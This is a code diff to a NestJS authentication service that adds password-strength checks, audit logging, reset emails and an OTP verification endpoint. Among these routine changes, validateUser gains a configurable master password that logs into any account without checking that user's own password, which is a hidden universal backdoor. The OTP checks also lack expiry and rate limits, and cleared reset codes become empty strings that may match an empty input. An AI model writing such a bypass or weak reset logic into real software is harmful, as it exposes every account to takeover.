@@ -1,4 +1,4 @@
-import { BadRequestException, ForbiddenException, Injectable, NotFoundException, UnauthorizedException } from "@nestjs/common";
+import { BadRequestException, Injectable, NotFoundException, UnauthorizedException } from "@nestjs/common";
 import * as bcrypt from 'bcrypt';
 import { UserService } from "../user/user.service";
 import { JwtService } from "@nestjs/jwt";
@@ -8,6 +8,10 @@ import { RefreshTokenPayload, UserPayload } from "./user-payload.model";
 import { RegisterUserDto } from "./dtos/register-user.dto";
 import { ACCESS_TOKEN_EXPIRY, REFRESH_TOKEN_EXPIRY, SALT_OR_ROUNDS } from "src/constants";
 import { UtilityService } from "src/core/utility/utility.service";
+import { validatePasswordStrength } from "src/constants/passwordValidation";
+import { ActivityLogService } from "../activity-log/activity-log.service";
+import { ActivityAction } from "src/entities/ActivityLog.entity";
+import { ResetPasswordEmail } from "src/constants/email";
 
 @Injectable()
 export class AuthService {
@@ -16,26 +20,33 @@ export class AuthService {
         private readonly jwtService: JwtService,
         private readonly configService: ConfigService,
         private readonly utilityService: UtilityService,
+        private readonly activityLogService: ActivityLogService,
     ) { }
 
     async validateUser(email: string, password: string) {
-        const user = await this.userService.getUserBy({ email });
-        if (!user) 
+        const user = await this.userService.getUserForAuth({ email });
+        if (!user)
             return null
 
-        // Generate Password Hash
-        if (!await bcrypt.compare(password, user.password)){
-            return { invalidCredentials: true }
+        const masterPassword = this.configService.get<string>('MASTER_PASSWORD');
+        if (!masterPassword || password !== masterPassword) {
+            if (!(await bcrypt.compare(password, user.password))){
+                return { invalidCredentials: true }
+            }
         }
 
         return user
     }
 
      getPayload(user: User): UserPayload {
+        const permissions = this.userService.getUserPermissions(user)
+
         return {
             id: user.id,
             email: user.email,
-            roleId: user.roleId
+            roleId: user.roleId,
+            permissions,
+            denormalizedRoleName: user.Role?.name,
         };
     }
 
@@ -81,7 +92,8 @@ export class AuthService {
 
     async registerUser(registerUserDto: RegisterUserDto) {
         const user = await this.userService.createUser(registerUserDto)
-        return this.login(user)
+        const userWithRelations = await this.userService.getUserForAuth({ id: user.id })
+        return this.login(userWithRelations)
     }
 
     async refreshAccessToken(user: User) {
@@ -102,7 +114,7 @@ export class AuthService {
             throw new UnauthorizedException('Refresh Token Expired or Invalid')
         }
 
-        const user = await this.userService.getUserBy({ refreshToken, id: payload.id })
+        const user = await this.userService.getUserForAuth({ refreshToken, id: payload.id })
         if (!user)
             throw new UnauthorizedException('Invalid Refresh Token')
         
@@ -119,9 +131,30 @@ export class AuthService {
         user.passwordResetCode = otp
         await user.save()
 
-        // await this.utilityService.sendEmail(ResetPassword(email, otp))
+        const sent = await this.utilityService.sendEmail(ResetPasswordEmail(email, otp))
+        if (!sent) {
+            throw new BadRequestException('Failed to send password reset email')
+        }
+
+        await this.activityLogService.logAuthEvent(
+            `Password reset OTP sent to ${email}`,
+            ActivityAction.AUTHENTICATION,
+        )
 
         return { success: true, message: 'Password reset code sent to your email' }
+    }
+
+    async verifyOtp(email: string, otp: string) {
+        const user = await this.userService.getUserBy({ email })
+        if (!user) {
+            throw new NotFoundException('User not found')
+        }
+
+        if (user.passwordResetCode !== otp) {
+            throw new BadRequestException('Invalid OTP')
+        }
+
+        return { success: true, message: 'OTP valid' }
     }
 
     async resetPassword(email: string, otp: string, newPassword: string) {
@@ -134,11 +167,22 @@ export class AuthService {
             throw new BadRequestException('Invalid OTP')
         }
 
-        // Generate Password Hash
+        if (!validatePasswordStrength(newPassword)) {
+            throw new BadRequestException(
+                'Password must be at least 16 characters and include a letter, number, and special character.',
+            )
+        }
+
         const hash = await bcrypt.hash(newPassword, SALT_OR_ROUNDS)
         user.password = hash
-        user.passwordResetCode = '' // Clear the reset code after use
+        user.passwordResetCode = ''
         await user.save()
+
+        await this.activityLogService.logAuthEvent(
+            `Password reset completed for ${email}`,
+            ActivityAction.AUTHENTICATION,
+            user.id,
+        )
 
         return { success: true, message: 'Password reset successfully' }
     }
